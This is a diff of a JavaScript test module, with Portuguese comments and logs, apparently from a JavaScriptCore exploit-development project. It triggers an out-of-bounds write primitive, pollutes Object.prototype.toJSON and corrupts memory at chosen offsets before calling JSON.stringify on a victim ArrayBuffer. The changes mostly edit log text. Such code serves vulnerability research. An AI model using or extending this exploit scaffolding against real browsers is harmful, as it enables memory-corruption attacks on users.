@@ -7,7 +7,8 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// current_toJSON_call_count_for_TypeError_test FOI REMOVIDO DESTE ARQUIVO
+// O contador é gerenciado em runAllAdvancedTestsS3.mjs
+// export let current_toJSON_call_count_for_TypeError_test = 0; // Não mais exportado daqui
 
 export async function executeFocusedTestForTypeError(
     testDescription,
@@ -17,13 +18,13 @@ export async function executeFocusedTestForTypeError(
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
     logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
-    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
+    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)} (em oob_array_buffer_real)`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
-    // O contador de chamadas toJSON agora é gerenciado pelo chamador em runAllAdvancedTestsS3.mjs
+    // O contador de chamadas toJSON é gerenciado e resetado pelo chamador em runAllAdvancedTestsS3.mjs
 
     const victim_ab_size_val = 64;
-    const bytes_to_write_val = 4;
+    const bytes_to_write_val = 4; // Para 0xFFFFFFFF
     const ppKey_val = 'toJSON';
 
     await triggerOOB_primitive();
@@ -34,7 +35,7 @@ export async function executeFocusedTestForTypeError(
     }
     document.title = "OOB OK - " + FNAME;
 
-    let victim_ab = new ArrayBuffer(victim_ab_size_val);
+    let victim_ab = new ArrayBuffer(victim_ab_size_val); // O alvo do stringify
     logS3(`ArrayBuffer vítima (${victim_ab_size_val} bytes) recriado.`, "info", FNAME);
 
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
@@ -46,30 +47,30 @@ export async function executeFocusedTestForTypeError(
 
     try {
         stepReached = "aplicando_pp";
-        logS3(`Poluindo Object.prototype.${ppKey_val} com ${testDescription}...`, "info", FNAME);
-        document.title = `Aplicando PP (${testDescription})`;
+        logS3(`Poluindo Object.prototype.${ppKey_val} com ${toJSONFunctionToUse.name || 'toJSON_function'}...`, "info", FNAME);
+        document.title = `Aplicando PP (${toJSONFunctionToUse.name || 'toJSON_function'})`;
         Object.defineProperty(Object.prototype, ppKey_val, {
             value: toJSONFunctionToUse,
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
-        logS3(`PP aplicada com ${testDescription}.`, "good", FNAME);
+        logS3(`PP aplicada com ${toJSONFunctionToUse.name || 'toJSON_function'}.`, "good", FNAME);
         stepReached = "pp_aplicada";
-        document.title = `PP OK (${testDescription})`;
+        document.title = `PP OK (${toJSONFunctionToUse.name || 'toJSON_function'})`;
 
         stepReached = "antes_escrita_oob";
-        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
+        logS3(`CORRUPÇÃO (em oob_array_buffer_real): ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
         document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
         oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
-        logS3("Escrita OOB feita.", "info", FNAME);
+        logS3("Escrita OOB (em oob_array_buffer_real) feita.", "info", FNAME);
         stepReached = "apos_escrita_oob";
         document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;
 
         await PAUSE_S3(SHORT_PAUSE_S3);
 
         stepReached = "antes_stringify";
-        document.title = `Antes Stringify (${toHex(corruptionOffsetToTest)})`;
-        logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME);
+        document.title = `Antes Stringify (victim_ab) (${toHex(corruptionOffsetToTest)})`;
+        logS3(`Chamando JSON.stringify(victim_ab) (usando ${toJSONFunctionToUse.name || 'toJSON_function'})...`, "info", FNAME);
         
         try {
             stringifyResult = JSON.stringify(victim_ab);
